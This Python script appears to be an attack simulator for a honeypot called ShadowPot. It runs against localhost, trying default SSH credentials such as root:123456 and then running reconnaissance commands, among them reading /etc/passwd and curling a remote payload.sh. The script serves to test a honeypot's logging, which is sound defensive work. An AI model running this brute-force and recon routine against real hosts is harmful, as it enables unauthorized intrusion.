#!/usr/bin/env python3
import time
import socket
import paramiko
import sys

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 2222

BRUTE_FORCE_LIST = [
    ("root", "123456"),
    ("admin", "admin123"),
    ("ubnt", "ubnt"),
    ("support", "support!"),
    ("oracle", "oracle"),
    ("test", "test"),
    ("root", "password123")
]

RECON_COMMANDS = [
    "id",
    "whoami",
    "uname -a",
    "cat /etc/os-release",
    "cat /etc/passwd",
    "ps aux",
    "netstat -tuln",
    "curl -s https://raw.githubusercontent.com/example/test/main/payload.sh"
]

def print_banner():
    print("=" * 60)
    print("   SHADOWPOT ATTACK SIMULATOR (Offensive Scenario Testing)")
    print("=" * 60)

def test_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3.0)
    try:
        s.connect((TARGET_HOST, TARGET_PORT))
        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
        s.close()
        print(f"[+] Target Honeypot Banner: {banner}")
        return True
    except Exception as e:
        print(f"[-] Could not connect to {TARGET_HOST}:{TARGET_PORT} - {e}")
        return False

def simulate_brute_force():
    print("\n[*] Phase 1: Simulating Brute Force Credential Guessing (MITRE T1110)...")
    for user, pwd in BRUTE_FORCE_LIST[:-1]:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            print(f"    -> Probing: {user}:{pwd}...", end=" ")
            client.connect(TARGET_HOST, port=TARGET_PORT, username=user, password=pwd, timeout=2)
            print("[SUCCESS/CAPTURED]")
            client.close()
        except paramiko.AuthenticationException:
            print("[FAILED]")
        except Exception as e:
            print(f"[ERROR: {e}]")
        time.sleep(0.3)

def simulate_session_and_recon():
    print("\n[*] Phase 2: Simulating Interactive Compromise & Recon (MITRE T1078 / T1082)...")
    user, pwd = "root", "password123"
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(TARGET_HOST, port=TARGET_PORT, username=user, password=pwd, timeout=5)
        print(f"[+] Successfully authenticated as {user}")

        for cmd in RECON_COMMANDS:
            stdin, stdout, stderr = client.exec_command(cmd)
            out = stdout.read().decode('utf-8', errors='ignore').strip()
            first_line = out.split('\n')[0] if out else "OK"
            print(f"    $ {cmd}  ==>  {first_line[:50]}...")
            time.sleep(0.4)

        client.close()
        print("[+] Session closed cleanly.")
    except Exception as e:
        print(f"[-] Error during interactive recon: {e}")

def main():
    print_banner()
    if not test_connection():
        print("[-] Ensure ShadowPot is running on port 2222 before launching simulator.")
        sys.exit(1)

    simulate_brute_force()
    simulate_session_and_recon()
    print("\n[+] Attack simulation finished! Check your Web Dashboard (http://localhost:8080) and logs/shadowpot.json.")

if __name__ == "__main__":
    main()
